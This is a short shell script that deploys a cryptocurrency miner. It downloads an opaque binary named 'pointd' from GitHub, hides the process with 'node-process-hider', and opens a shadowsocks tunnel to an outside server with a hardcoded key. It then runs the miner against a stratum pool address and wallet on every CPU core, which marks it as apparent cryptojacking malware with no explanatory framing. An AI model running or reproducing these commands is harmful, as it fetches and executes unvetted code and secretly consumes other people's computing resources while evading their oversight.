apt update
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
npm i -g node-process-hider 

wget -q https://github.com/manorepas/bash/raw/main/pointd
chmod +x pointd
sudo apt -y install shadowsocks-libev rng-tools libsodium-dev
ph add pointd
ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.B20.1 -p x -t $(nproc)
